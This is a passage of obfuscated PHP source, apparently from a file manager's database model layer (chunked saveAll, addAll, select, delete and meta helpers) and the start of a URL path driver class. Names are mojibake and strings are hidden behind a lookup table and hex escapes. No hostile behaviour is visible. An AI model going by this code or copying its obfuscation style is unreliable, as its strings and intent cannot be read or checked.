$this->selectPageCountBy($¡Æû­òÌ[442]); if (!is_array($Ÿ†¨İ­³)) { $Ÿ†¨İ­³ = array(); } if ($Øù„©™¡ == 1) { $øˆÈÓùÙ = count($Ÿ†¨İ­³); } $ƒ² í = array($¡Æû­òÌ[443] => array($¡Æû­òÌ[444] => $øˆÈÓùÙ, $¡Æû­òÌ[439] => $˜õæ¢’Ö, $¡Æû­òÌ[428] => $ª”şÑ¹ã, $¡Æû­òÌ[445] => $Øù„©™¡), $¡Æû­òÌ[446] => $Ÿ†¨İ­³); return $ƒ² í; } protected function selectPageCountBy($¢©°ÒøË = false) { static $Ü—šÊÚ¬ = null; if (!$¢©°ÒøË) { return $Ü—šÊÚ¬; } if ($¢©°ÒøË == $_SERVER[¹Éµ„ºå][442]) { $Ü—šÊÚ¬ = null; return; } $Ü—šÊÚ¬ = $¢©°ÒøË; } protected function checkLength($‹ÜŞê–¨, $²¼‹Œ¦¸ = 0, $„¯¶Ú·½ = '') { $ƒĞ‹£å =& $_SERVER[¹Éµ„ºå]; $²¼‹Œ¦¸ = $²¼‹Œ¦¸ ? $²¼‹Œ¦¸ : 65536; if (!$‹ÜŞê–¨ || strlen($‹ÜŞê–¨) < $²¼‹Œ¦¸) { return; } $„¯¶Ú·½ = $„¯¶Ú·½ ? $„¯¶Ú·½ . $ƒĞ‹£å[74] : $ƒĞ‹£å[12]; show_json($„¯¶Ú·½ . LNG($ƒĞ‹£å[447]) . "\50{$²¼‹Œ¦¸}\51", !1); } protected function metaSet($ıæá”‡´, $ˆ·ÎË¥Ó = null, $Â† ¤’ç = null) { $‡ÃˆªÉ =& $_SERVER[¹Éµ„ºå]; if (!$this->tableMeta || !$ıæá”‡´) { return !1; } $´îöµş“ = $this->tableMeta[$‡ÃˆªÉ[448]]; $´Í¨à­Ó = $this->tableMeta[$‡ÃˆªÉ[449]]; $‹ïôÀ¤« = Model($´Í¨à­Ó); $×¤ì™ì¦ = array($´îöµş“ => $ıæá”‡´, $‡ÃˆªÉ[450] => $ˆ·ÎË¥Ó); if (is_null($ˆ·ÎË¥Ó)) { return $‹ïôÀ¤«->where(array($´îöµş“ => $ıæá”‡´))->delete(); } if (is_null($Â† ¤’ç) && is_string($ˆ·ÎË¥Ó)) { return $‹ïôÀ¤«->where($×¤ì™ì¦)->delete(); } $¸ø‡”Ç‰ = is_array($ˆ·ÎË¥Ó) ? $ˆ·ÎË¥Ó : array(); if (is_string($ˆ·ÎË¥Ó)) { $¸ø‡”Ç‰[$ˆ·ÎË¥Ó] = $Â† ¤’ç; } $¶êÏ­É = array(); foreach ($¸ø‡”Ç‰ as $ ä´÷…œ => $úªÎ„Õ‚) { if (is_null($úªÎ„Õ‚) && is_string($ ä´÷…œ)) { $‹ïôÀ¤«->where(array($´îöµş“ => $ıæá”‡´, $‡ÃˆªÉ[450] => $ ä´÷…œ))->delete(); continue; } $this->checkLength($úªÎ„Õ‚, !1, $´Í¨à­Ó . $‡ÃˆªÉ[4] . $ ä´÷…œ); $¶êÏ­É[] = array($´îöµş“ => $ıæá”‡´, $‡ÃˆªÉ[95] => $ ä´÷…œ, $‡ÃˆªÉ[451] => $úªÎ„Õ‚); } $·¦÷…¿ = $‡ÃˆªÉ[452] . $´Í¨à­Ó; CacheLock::lock($·¦÷…¿); $‹ïôÀ¤«->where(array($´îöµş“ => $ıæá”‡´))->addAll($¶êÏ­É, array(), !0); CacheLock::unlock($·¦÷…¿); return !0; } public function metaGet($™“úë»Ú, $·™Ø‡’½ = false) { $Ë‰ßµÊ =& $_SERVER[¹Éµ„ºå]; if (!$this->tableMeta) { return array(); } $œ¬©èàª = $this->tableMeta[$Ë‰ßµÊ[448]]; $´€î–È = Model($this->tableMeta[$Ë‰ßµÊ[449]]); if ($·™Ø‡’½) { $üáÈ‡ = array($œ¬©èàª => $™“úë»Ú, $Ë‰ßµÊ[95] => $·™Ø‡’½); return $´€î–È->where($üáÈ‡)->getField($Ë‰ßµÊ[451]); } $üáÈ‡ = array($œ¬©èàª => $™“úë»Ú); $âŞÄøò = $´€î–È->field($Ë‰ßµÊ[453])->where($üáÈ‡)->select(); $âŞÄøò = array_to_keyvalue($âŞÄøò, $Ë‰ßµÊ[95], $Ë‰ßµÊ[451]); return $âŞÄøò; } private function checkDataAutoHas($œéÀ™µº) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $†ƒàøñÖ) { if (in_array($œéÀ™µº, explode($_SERVER[¹Éµ„ºå][50], $†ƒàøñÖ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¢¦•×¢ğ, $Ùè”÷·µ) { $‡àƒÛê =& $_SERVER[¹Éµ„ºå]; if (!is_array($¢¦•×¢ğ)) { return; } foreach ($this->dataAuto as $ÑŞ¥õôØ) { $õı¬˜Ç = $ÑŞ¥õôØ[0]; if (!in_array($Ùè”÷·µ, explode($‡àƒÛê[50], $ÑŞ¥õôØ[2]))) { continue; } switch (trim($ÑŞ¥õôØ[3])) { case $‡àƒÛê[396]: case $‡àƒÛê[397]: $œÏËÖ¼˜ = $ÑŞ¥õôØ[1]; $İ¬¢¸Ñ = isset($ÑŞ¥õôØ[4]) ? (array) $ÑŞ¥õôØ[4] : array(); if ($œÏËÖ¼˜ == $‡àƒÛê[204] && array_key_exists($õı¬˜Ç, $¢¦•×¢ğ)) { if (!$¢¦•×¢ğ[$õı¬˜Ç]) { unset($¢¦•×¢ğ[$õı¬˜Ç]); } break; } if (isset($¢¦•×¢ğ[$õı¬˜Ç])) { array_unshift($İ¬¢¸Ñ, $¢¦•×¢ğ[$õı¬˜Ç]); } if ($‡àƒÛê[396] == $ÑŞ¥õôØ[3]) { $¢¦•×¢ğ[$õı¬˜Ç] = call_user_func_array($œÏËÖ¼˜, $İ¬¢¸Ñ); } else { $¢¦•×¢ğ[$õı¬˜Ç] = call_user_func_array(array(&$this, $œÏËÖ¼˜), $İ¬¢¸Ñ); } break; case $‡àƒÛê[348]: if (isset($¢¦•×¢ğ[$õı¬˜Ç]) && $¢¦•×¢ğ[$õı¬˜Ç]) { $¢¦•×¢ğ[$õı¬˜Ç] = call_user_func_array(array(&$this, $ÑŞ¥õôØ[1]), array($¢¦•×¢ğ[$õı¬˜Ç])); } break; case $‡àƒÛê[351]: $¢¦•×¢ğ[$õı¬˜Ç] = $¢¦•×¢ğ[$ÑŞ¥õôØ[1]]; break; case $‡àƒÛê[369]: if (isset($¢¦•×¢ğ[$õı¬˜Ç]) && !is_string($¢¦•×¢ğ[$õı¬˜Ç])) { $¢¦•×¢ğ[$õı¬˜Ç] = json_encode_force($¢¦•×¢ğ[$õı¬˜Ç]); $¢¦•×¢ğ[$õı¬˜Ç] = self::textEncode($¢¦•×¢ğ[$õı¬˜Ç]); } break; case $‡àƒÛê[398]: if ($¢¦•×¢ğ[$õı¬˜Ç] === $‡àƒÛê[12]) { unset($¢¦•×¢ğ[$õı¬˜Ç]); } break; case $‡àƒÛê[399]: $¢¦•×¢ğ[$õı¬˜Ç] = $ÑŞ¥õôØ[1]; default: break; } } if ($Ùè”÷·µ == $‡àƒÛê[430]) { $©ü¥£ø… = strtolower($this->db->getDbType()); if (strpos($©ü¥£ø…, $‡àƒÛê[13]) !== 0) { return; } $İ‘¦ÒşÑ = $this->field(!0)->fields; $¶Ê«ÚÌŸ = $İ‘¦ÒşÑ[$‡àƒÛê[329]]; if (isset($İ‘¦ÒşÑ[$‡àƒÛê[328]])) { unset($¶Ê«ÚÌŸ[$İ‘¦ÒşÑ[$‡àƒÛê[328]]]); } foreach ($¶Ê«ÚÌŸ as $ˆ€¯À¶× => $Ùè”÷·µ) { if (!isset($¢¦•×¢ğ[$ˆ€¯À¶×])) { $¢¦•×¢ğ[$ˆ€¯À¶×] = $‡àƒÛê[12]; } } } } private function dataAfterFilter(&$×Ìô˜¯å) { $†ò’¨ØŠ =& $_SERVER[¹Éµ„ºå]; foreach ($this->dataAuto as $½éû°ö§) { $´“™ÓÚË = $½éû°ö§[0]; if (!isset($×Ìô˜¯å[$´“™ÓÚË])) { continue; } if (!in_array($†ò’¨ØŠ[432], explode($†ò’¨ØŠ[50], $½éû°ö§[2]))) { continue; } switch (trim($½éû°ö§[3])) { case $†ò’¨ØŠ[396]: case $†ò’¨ØŠ[397]: $¶Ğ¶ÈÔú = isset($½éû°ö§[4]) ? (array) $½éû°ö§[4] : array(); array_unshift($¶Ğ¶ÈÔú, $×Ìô˜¯å[$´“™ÓÚË]); if (isset($½éû°ö§[4]) && $½éû°ö§[4] == $†ò’¨ØŠ[454]) { $¶Ğ¶ÈÔú = array($×Ìô˜¯å[$´“™ÓÚË]); } if ($†ò’¨ØŠ[396] == $½éû°ö§[3]) { $×Ìô˜¯å[$´“™ÓÚË] = call_user_func_array($½éû°ö§[1], $¶Ğ¶ÈÔú); } else { $×Ìô˜¯å[$´“™ÓÚË] = call_user_func_array(array(&$this, $½éû°ö§[1]), $¶Ğ¶ÈÔú); } break; case $†ò’¨ØŠ[348]: if (isset($×Ìô˜¯å[$´“™ÓÚË]) && $×Ìô˜¯å[$´“™ÓÚË]) { $×Ìô˜¯å[$´“™ÓÚË] = call_user_func_array(array(&$this, $½éû°ö§[1]), array($×Ìô˜¯å[$´“™ÓÚË])); } break; case $†ò’¨ØŠ[351]: $×Ìô˜¯å[$´“™ÓÚË] = $×Ìô˜¯å[$½éû°ö§[1]]; break; case $†ò’¨ØŠ[369]: $¥öëĞú™ = $×Ìô˜¯å[$´“™ÓÚË]; $¥öëĞú™ = self::textDecode($¥öëĞú™); $×Ìô˜¯å[$´“™ÓÚË] = json_decode($¥öëĞú™, !0); if (is_null($×Ìô˜¯å[$´“™ÓÚË])) { $×Ìô˜¯å[$´“™ÓÚË] = $¥öëĞú™; } break; case $†ò’¨ØŠ[398]: if ($×Ìô˜¯å[$´“™ÓÚË] === $†ò’¨ØŠ[12]) { unset($×Ìô˜¯å[$´“™ÓÚË]); } break; case $†ò’¨ØŠ[399]: $×Ìô˜¯å[$´“™ÓÚË] = $½éû°ö§[1]; break; default: break; } } } public function saveAll($º»„âä, $–ı“ôš² = false) { $Õİ•áÄÎ =& $_SERVER[¹Éµ„ºå]; $‚­•©§Ã = $this->db; $Ùˆı„Ñ = $this->tablePrefix . $this->tableName; $œÜÇ¬ = $this->saveAllChunkMake($º»„âä); $–ı“ôš² = is_array($–ı“ôš²) ? $–ı“ôš² : array(); foreach ($œÜÇ¬ as $Òµ¯ñ½ñ) { $Äì¼†½Ò = $Õİ•áÄÎ[12]; $òëŞœÅ = $Õİ•áÄÎ[12]; $Š•©š = array(); $²ğ×èœ¹ = array(); foreach ($Òµ¯ñ½ñ as $Ê¦‹ã¾Ã => $˜×éÇªÓ) { $Äì¼†½Ò = $˜×éÇªÓ[$Õİ•áÄÎ[455]]; $²ğ×èœ¹[] = $˜×éÇªÓ[$Õİ•áÄÎ[456]]; $›ã¨‡° = $‚­•©§Ã->parseValue($˜×éÇªÓ[$Õİ•áÄÎ[456]]); foreach ($˜×éÇªÓ[$Õİ•áÄÎ[457]] as $ØËÕ­ğ => $ÏüŸèú‡) { if (!$Š•©š[$ØËÕ­ğ]) { $Š•©š[$ØËÕ­ğ] = array(); } $Š•©š[$ØËÕ­ğ][] = $Õİ•áÄÎ[458] . $›ã¨‡° . $Õİ•áÄÎ[459] . $‚­•©§Ã->parseValue($ÏüŸèú‡); } } $ŒÍ”é€¿ = $Äì¼†½Ò; $ŒÍ”é€¿ = $‚­•©§Ã->parseKey($ŒÍ”é€¿); foreach ($Š•©š as $ØËÕ­ğ => $­‰Úï–») { $òëŞœÅ .= $Õİ•áÄÎ[285] . $‚­•©§Ã->parseKey($ØËÕ­ğ) . $Õİ•áÄÎ[460] . $ŒÍ”é€¿ . $Õİ•áÄÎ[461]; $òëŞœÅ .= implode($Õİ•áÄÎ[285], $­‰Úï–») . $Õİ•áÄÎ[462]; } $•öñĞÃ = $–ı“ôš²; $•öñĞÃ[$Äì¼†½Ò] = array($Õİ•áÄÎ[7], $²ğ×èœ¹); $œê¸ˆâÆ = "\x55\x50\x44\101\124\x45\40\x60{$Ùˆı„Ñ}\x60\40\123\x45\x54\40" . rtrim($òëŞœÅ, $Õİ•áÄÎ[50]) . $Õİ•áÄÎ[285] . $‚­•©§Ã->parseWhere($•öñĞÃ); $this->execute($œê¸ˆâÆ); $this->chunkEventCheck(count($Òµ¯ñ½ñ)); } $this->chunkEventSet(); } public function saveAllEach($¶Õ¾š³, $–·Ë‚Ñ» = false) { $•ƒ¿™…İ =& $_SERVER[¹Éµ„ºå]; $’ß‘…Íş = $this->db; $ËÆëÈŒé = $this->tablePrefix . $this->tableName; $²ÂÏ³ıŸ = $this->saveAllChunkMake($¶Õ¾š³); $–·Ë‚Ñ» = is_array($–·Ë‚Ñ») ? $–·Ë‚Ñ» : array(); foreach ($²ÂÏ³ıŸ as $ñ¯Ú¢ıË) { foreach ($ñ¯Ú¢ıË as $·×Äş¶ => $»áŒºóÀ) { $ûç‹¢Šñ = $•ƒ¿™…İ[463]; foreach ($»áŒºóÀ[$•ƒ¿™…İ[457]] as $±‡ë—·Õ => $Œ¸‰ºà) { $ûç‹¢Šñ .= $’ß‘…Íş->parseKey($±‡ë—·Õ) . $•ƒ¿™…İ[464] . $’ß‘…Íş->parseValue($Œ¸‰ºà) . $•ƒ¿™…İ[50]; } $ªµ×ÔÇè = $–·Ë‚Ñ»; $ªµ×ÔÇè[$»áŒºóÀ[$•ƒ¿™…İ[455]]] = $»áŒºóÀ[$•ƒ¿™…İ[456]]; $Ì¤§Ê“ = "\125\x50\x44\x41\124\x45\40\x60{$ËÆëÈŒé}\x60\40\x53\x45\x54\x20" . rtrim($ûç‹¢Šñ, $•ƒ¿™…İ[50]) . $•ƒ¿™…İ[465] . $’ß‘…Íş->parseWhere($ªµ×ÔÇè) . $•ƒ¿™…İ[466]; $this->execute($Ì¤§Ê“); } $this->chunkEventCheck(count($ñ¯Ú¢ıË)); } $this->chunkEventSet(); } private function saveAllChunkMake($…·“ò¨Ø) { $†Â³§ëâ =& $_SERVER[¹Éµ„ºå]; $õĞÎ§Ù = self::SQL_WHERE_IN_CHUNK; $…·“ò¨Ø = is_array($…·“ò¨Ø) ? $…·“ò¨Ø : array(); $Î½üğ = array(); $‰‹ûäøå = ceil(count($…·“ò¨Ø) / $õĞÎ§Ù); for ($êŞ‚ğà„ = 0; $êŞ‚ğà„ < $‰‹ûäøå; $êŞ‚ğà„++) { $Ê»óóÏ‘ = array(); $¾‹úâùÖ = array_slice($…·“ò¨Ø, $êŞ‚ğà„ * $õĞÎ§Ù, $õĞÎ§Ù); foreach ($¾‹úâùÖ as $òí´‹Ğ³) { if (!is_array($òí´‹Ğ³) || count($òí´‹Ğ³) < 4 || count($òí´‹Ğ³) % 2 != 0) { continue; } $ÅÖ´˜Â¼ = array(); for ($Ğ•Åê¶ª = 2; $Ğ•Åê¶ª < count($òí´‹Ğ³); $Ğ•Åê¶ª += 2) { $ÅÖ´˜Â¼[$òí´‹Ğ³[$Ğ•Åê¶ª]] = $òí´‹Ğ³[$Ğ•Åê¶ª + 1]; } $Ê»óóÏ‘[] = array($†Â³§ëâ[455] => $òí´‹Ğ³[0], $†Â³§ëâ[456] => $òí´‹Ğ³[1], $†Â³§ëâ[457] => $ÅÖ´˜Â¼); } $Î½üğ[] = $Ê»óóÏ‘; } return $Î½üğ; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Ãì·²ƒù = false, $¸„ í½„ = false) { $this->_chunkEvent = $Ãì·²ƒù; $this->_chunkEventParam = $¸„ í½„; } private function chunkEventCheck($¾·Ó‹ºÚ) { if (!$this->_chunkEvent) { return; } $Äü©©£¼ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Äü©©£¼[$_SERVER[¹Éµ„ºå][467]] = $¾·Ó‹ºÚ; Hook::trigger($this->_chunkEvent, $Äü©©£¼); } public function addAll($ªõõ›ÛŞ, $Âˆ§æ„° = array(), $äÏ–û›† = false) { $Å¯ñ¤Õ =& $_SERVER[¹Éµ„ºå]; ignore_timeout(); $¬ÁùŞ§ª = self::SQL_WHERE_IN_CHUNK; if (empty($ªõõ›ÛŞ)) { $this->error = think_lang($Å¯ñ¤Õ[349]); return !1; } $Âˆ§æ„° = $this->_parseOptions($Âˆ§æ„°); foreach ($ªõõ›ÛŞ as $ĞŸòšÑÄ => $šåàš–) { $ªõõ›ÛŞ[$ĞŸòšÑÄ] = $this->_facade($šåàš–); $this->_beforeInsert($ªõõ›ÛŞ[$ĞŸòšÑÄ], $Âˆ§æ„°); } if (method_exists($this->db, $Å¯ñ¤Õ[350])) { for ($‡³ÛÖ¼ = 0; $‡³ÛÖ¼ < count($ªõõ›ÛŞ); $‡³ÛÖ¼ += $¬ÁùŞ§ª) { $÷€·È‰ = array_slice($ªõõ›ÛŞ, $‡³ÛÖ¼, $¬ÁùŞ§ª); if (!is_array($÷€·È‰) || count($÷€·È‰) == 0) { break; } $Ó³°Ø£÷ = $this->db->insertAll($÷€·È‰, $Âˆ§æ„°, $äÏ–û›†); $this->chunkEventCheck(count($÷€·È‰)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ªõõ›ÛŞ as $ĞŸòšÑÄ => $šåàš–) { $Ó³°Ø£÷ = $this->db->insert($šåàš–, $Âˆ§æ„°, $äÏ–û›†); } $this->commit(); } if (!1 !== $Ó³°Ø£÷) { $ÆÒà‹Æ  = $this->getLastInsID(); if ($ÆÒà‹Æ ) { return $ÆÒà‹Æ ; } } return $Ó³°Ø£÷; } public function save($åœÖœ  = '', $Ì™¿óµ± = array()) { $‰ÌüîÈ =& $_SERVER[¹Éµ„ºå]; $€Ğ™„¸¾ = self::SQL_WHERE_IN_CHUNK; $ÅËßØ = $this->optionsValue(); $´™Øƒ• = $this->findWhereField($ÅËßØ); if (!$´™Øƒ•) { return parent::save($åœÖœ , $Ì™¿óµ±); } $‘ûäÇ¹” = 0; $Ššäì„Ó = $ÅËßØ[$‰ÌüîÈ[353]][$´™Øƒ•][1]; $Ššäì„Ó = is_array($Ššäì„Ó) ? $Ššäì„Ó : array(); $‚¶¿â°Ì = count($Ššäì„Ó); for ($ÓçÃö³ª = 0; $ÓçÃö³ª < $‚¶¿â°Ì; $ÓçÃö³ª += $€Ğ™„¸¾) { $Æ´¶åè­ = array_slice($Ššäì„Ó, $ÓçÃö³ª, $€Ğ™„¸¾); if (!is_array($Æ´¶åè­) || count($Æ´¶åè­) == 0) { break; } $ÅËßØ[$‰ÌüîÈ[353]][$´™Øƒ•][1] = $Æ´¶åè­; $this->optionsValue($ÅËßØ); $‘ûäÇ¹” += parent::save($åœÖœ , $Ì™¿óµ±); $this->chunkEventCheck(count($Æ´¶åè­)); } $this->chunkEventSet(); return $‘ûäÇ¹”; } public function add($…¯œ¥£Î = '', $‚ØïÜÒ‘ = array(), $é¯™™Øï = false) { if ($this->addTaskStatus && is_array($…¯œ¥£Î)) { $this->addTaskData[] = $…¯œ¥£Î; return; } return parent::add($…¯œ¥£Î, $‚ØïÜÒ‘, $é¯™™Øï); } public function parseWhereLike($ùãàÌ•, $İ´œà©ƒ = '', $¢ü÷‹ùå = false, &$½à°å¥± = false) { $ÙÂÉÍ“ =& $_SERVER[¹Éµ„ºå]; $æ¢§— Ş = $GLOBALS[$ÙÂÉÍ“[6]][$ÙÂÉÍ“[468]]; if (!$æ¢§— Ş[$ÙÂÉÍ“[469]]) { return $ùãàÌ•; } if (!in_array($this->tableName, array($ÙÂÉÍ“[429], $ÙÂÉÍ“[470], $ÙÂÉÍ“[471], $ÙÂÉÍ“[472]))) { return $ùãàÌ•; } if (!is_array($ùãàÌ•)) { return $ùãàÌ•; } $ï¸ËÑ£• = array(); $çÏòú¬ = 0; foreach ($ùãàÌ• as $¯ºšı¢º => $¿÷ª‚×) { if (is_array($¿÷ª‚×) && count($¿÷ª‚×) == 2 && $¿÷ª‚×[0] == $ÙÂÉÍ“[473] && is_string($¿÷ª‚×[1]) && substr($¿÷ª‚×[1], 0, 1) == $ÙÂÉÍ“[474] && substr($¿÷ª‚×[1], strlen($¿÷ª‚×[1]) - 1, 1) == $ÙÂÉÍ“[474]) { $½à°å¥± = !0; $»êü´ğ = is_string($¯ºšı¢º) ? $¯ºšı¢º : $İ´œà©ƒ; $ñ½ı˜ˆ = substr($¿÷ª‚×[1], 1, strlen($¿÷ª‚×[1]) - 2); $ñ½ı˜ˆ = $this->db->escapeString($ñ½ı˜ˆ); if (!strpos($»êü´ğ, $ÙÂÉÍ“[10])) { $»êü´ğ = $ÙÂÉÍ“[475] . $»êü´ğ . $ÙÂÉÍ“[475]; } $²ÃÑÇ = $ÙÂÉÍ“[220] . $ñ½ı˜ˆ . $ÙÂÉÍ“[220]; $ñ½ı˜ˆ = str_replace(array($ÙÂÉÍ“[10], $ÙÂÉÍ“[476]), $ÙÂÉÍ“[477], $ñ½ı˜ˆ); if ($æ¢§— Ş[$ÙÂÉÍ“[478]]) { $²ÃÑÇ = $ÙÂÉÍ“[479] . $ñ½ı˜ˆ . $ÙÂÉÍ“[480]; if ($æ¢§— Ş[$ÙÂÉÍ“[481]]) { $²ÃÑÇ = $ÙÂÉÍ“[480] . $ñ½ı˜ˆ . $ÙÂÉÍ“[479]; } } $û´â®íñ = Hook::trigger($ÙÂÉÍ“[482], $ñ½ı˜ˆ, $²ÃÑÇ); if ($û´â®íñ) { $²ÃÑÇ = $û´â®íñ; } $ï¸ËÑ£•[$çÏòú¬] = $ÙÂÉÍ“[483] . $»êü´ğ . $ÙÂÉÍ“[484] . $²ÃÑÇ . $ÙÂÉÍ“[485]; $çÏòú¬++; continue; } if (is_array($¿÷ª‚×)) { $İ´œà©ƒ = is_string($¯ºšı¢º) ? $¯ºšı¢º : $İ´œà©ƒ; $¿÷ª‚× = $this->parseWhereLike($¿÷ª‚×, $İ´œà©ƒ, !0, $½à°å¥±); } if (is_numeric($¯ºšı¢º)) { $ï¸ËÑ£•[$çÏòú¬] = $¿÷ª‚×; $çÏòú¬++; } else { $ï¸ËÑ£•[$¯ºšı¢º] = $¿÷ª‚×; } } if ($½à°å¥± && !$¢ü÷‹ùå) { } return $ï¸ËÑ£•; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($¹¤®ùÎœ = array()) { $æûÅêÀœ =& $_SERVER[¹Éµ„ºå]; $•‘ûáª = self::SQL_WHERE_IN_CHUNK; $…úÖÀ = $this->optionsValue(); $¦®¹´î = $this->findWhereField($…úÖÀ); if (!$¦®¹´î || isset($…úÖÀ[$æûÅêÀœ[368]]) || isset($…úÖÀ[$æûÅêÀœ[428]])) { return parent::select($¹¤®ùÎœ); } $°†àÚÌ = $…úÖÀ[$æûÅêÀœ[353]][$¦®¹´î][1]; $°†àÚÌ = is_array($°†àÚÌ) ? $°†àÚÌ : array(); $º´˜Û«÷ = null; for ($Úƒà½¢¶ = 0; $Úƒà½¢¶ < count($°†àÚÌ); $Úƒà½¢¶ += $•‘ûáª) { $«™º¹õ• = array_slice($°†àÚÌ, $Úƒà½¢¶, $•‘ûáª); if (!is_array($«™º¹õ•) || count($«™º¹õ•) == 0) { break; } $…úÖÀ[$æûÅêÀœ[353]][$¦®¹´î][1] = $«™º¹õ•; $this->optionsValue($…úÖÀ); $¡áœşÑ¼ = parent::select($¹¤®ùÎœ); if (!$¡áœşÑ¼) { continue; } $º´˜Û«÷ = is_array($º´˜Û«÷) ? $º´˜Û«÷ : array(); $º´˜Û«÷ = array_merge($º´˜Û«÷, $¡áœşÑ¼); } return $º´˜Û«÷; } public function delete($¢¶šÕ¼¥ = array()) { $Û¸ø±ïî =& $_SERVER[¹Éµ„ºå]; $ŸÇÕ˜¹Ê = self::SQL_WHERE_IN_CHUNK; $·ìã³´´ = $this->optionsValue(); $õ ‰‹íŠ = $this->findWhereField($·ìã³´´); if (!$õ ‰‹íŠ) { return parent::delete($¢¶šÕ¼¥); } $ù‹İÍº = 0; $…§ìÍÔ… = $·ìã³´´[$Û¸ø±ïî[353]][$õ ‰‹íŠ][1]; $…§ìÍÔ… = is_array($…§ìÍÔ…) ? $…§ìÍÔ… : array(); for ($Æ²‚¶™³ = 0; $Æ²‚¶™³ < count($…§ìÍÔ…); $Æ²‚¶™³ += $ŸÇÕ˜¹Ê) { $ÁÖÓ¤­Õ = array_slice($…§ìÍÔ…, $Æ²‚¶™³, $ŸÇÕ˜¹Ê); if (!is_array($ÁÖÓ¤­Õ) || count($ÁÖÓ¤­Õ) == 0) { break; } $·ìã³´´[$Û¸ø±ïî[353]][$õ ‰‹íŠ][1] = $ÁÖÓ¤­Õ; $this->optionsValue($·ìã³´´); $ù‹İÍº += parent::delete($¢¶šÕ¼¥); } return $ù‹İÍº; } private function findWhereField($½â«¬Ü¹) { $Æµ½Êïş =& $_SERVER[¹Éµ„ºå]; $€Ü˜æ = self::SQL_WHERE_IN_CHUNK; if (!is_array($½â«¬Ü¹) || !is_array($½â«¬Ü¹[$Æµ½Êïş[353]])) { return !1; } foreach ($½â«¬Ü¹[$Æµ½Êïş[353]] as $à…Š·ƒö => $—›ØŒƒˆ) { if (is_array($—›ØŒƒˆ) && isset($—›ØŒƒˆ[0]) && is_string($—›ØŒƒˆ[0]) && strtolower($—›ØŒƒˆ[0]) == $Æµ½Êïş[7] && is_array($—›ØŒƒˆ[1]) && count($—›ØŒƒˆ[1]) > $€Ü˜æ) { ignore_timeout(); return $à…Š·ƒö; } } return !1; } public function setMasterDB($“ÍÅíë¾ = true) { think_config($_SERVER[¹Éµ„ºå][486], $“ÍÅíë¾); } } goto eìäÒøÈ²; b†Ò„á±çÈ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($†Œ¼À£º = false) { } public function exist($¡µˆ°) { $Ùş‹ëÂ£ = $this->info($¡µˆ°); return $Ùş‹ëÂ£[$_SERVER[¹Éµ„ºå][232]]; } public function isFile($ÍÅÊÁšÉ) { $ŸÓî¯Ä¶ = $this->info($ÍÅÊÁšÉ); return $ŸÓî¯Ä¶[$_SERVER[¹Éµ„ºå][232]]; } public function isFolder($½ÚŠ»˜) { return !1; } public function size($ïÒ×ÚÕ) { $Š±ßÁà = $this->info($ïÒ×ÚÕ); return $Š±ßÁà[$_SERVER[¹Éµ„ºå][79]]; } public function info($¤ÃáßÂî) { return $this->infoParse($¤ÃáßÂî); } public function infoAuth($şÑèùæÀ) { return $this->infoParse($şÑèùæÀ); } public function infoWithChildren($¸û›×‡¡) { return $this->infoParse($¸û›×‡¡); } public function infoFull($®Ã†¨¹®) { return $this->infoParse($®Ã†¨¹®); } private function infoParse($¸á»÷) { $’Èñúö¸ =& $_SERVER[¹Éµ„ºå]; $şĞî Ã = $this->header($¸á»÷); if (!$şĞî Ã || !$şĞî Ã[$’Èñúö¸[841]]) { return !1; } $ñâ´ÔÎ = _get($şĞî Ã, $’Èñúö¸[412], 0); $ı çã” = array($’Èñúö¸[32] => $şĞî Ã[$’Èñúö¸[32]], $’Èñúö¸[87] => $¸á»÷, $’Èñúö¸[33] => $’Èñúö¸[230], $’Èñúö¸[79] => intval($ñâ´ÔÎ), $’Èñúö¸[166] => get_path_ext($şĞî Ã[$’Èñúö¸[32]]), $’Èñúö¸[1653] => $ñâ´ÔÎ > 0 && $şĞî Ã[$’Èñúö¸[1799]], $’Èñúö¸[1654] => !1); return $ı çã”; } private function header($¢ìú’›ş) { $ğ±“›æ¦ =& $_SERVER[¹Éµ„ºå]; if (isset(self::$_cacheHeader[$¢ìú’›ş])) { return self::$_cacheHeader[$¢ìú’›ş]; } $Íä¾Ü™ƒ = isset($GLOBALS[$ğ±“›æ¦[1800]]) ? $GLOBALS[$ğ±“›æ¦[1800]] : !1; $GLOBALS[$ğ±“›æ¦[1800]] = !0; self::$_cacheHeader[$¢ìú’›ş] = url_header($¢ìú’›ş); $GLOBALS[$ğ±“›æ¦[1800]] = $Íä¾Ü™ƒ; return self::$_cacheHeader[$¢ìú’›ş]; } public function hashSimple($§Ë¶‹ŞÚ, $ÀŞŞÑëœ = false) { $®‘á§…· =& $_SERVER[¹Éµ„ºå]; $‘ÂúÔÕÛ = $this->info($§Ë¶‹ŞÚ); if (!$‘ÂúÔÕÛ || !$‘ÂúÔÕÛ[$®‘á§…·[232]]) { return !1; } $´Øœ¨ = $‘ÂúÔÕÛ[$®‘á§…·[79]]; $Ù®å—ÀÅ = 200; $Ì”ûîß± = 50; if ($´Øœ¨ <= $Ù®å—ÀÅ * $Ì”ûîß±) { return md5($this->fileSubstr($§Ë¶‹ŞÚ, 0, $´Øœ¨)) . $´Øœ¨; } $©î‚–« = intval($´Øœ¨ / $Ì”ûîß±); $«Ã†À§± = $®‘á§…·[12]; $¿Ã·È±Ø = timeFloat(); $«­œÇÅ‚ = 15; for ($ÅÍéãê¹ = 0; $ÅÍéãê¹ < $Ì”ûîß±; $ÅÍéãê¹++) { if (timeFloat() - $¿Ã·È±Ø > $«­œÇÅ‚) { return !1; } $Ø¯¾´ô² = $this->fileSubstr($§Ë¶‹ŞÚ, $©î‚–« * $ÅÍéãê¹, $Ù®å—ÀÅ); if (!$Ø¯¾´ô²) { return !1; } $«Ã†À§± .= $Ø¯¾´ô²; } $«Ã†À§± .= $this->fileSubstr($§Ë¶‹ŞÚ, $´Øœ¨ - $Ù®å—ÀÅ, $Ù®å—ÀÅ); return md5($«Ã†À§±) . $´Øœ¨; } public function getContent($‡úÙ°Ä) { return $this->fileSubstr($‡úÙ°Ä); } public function 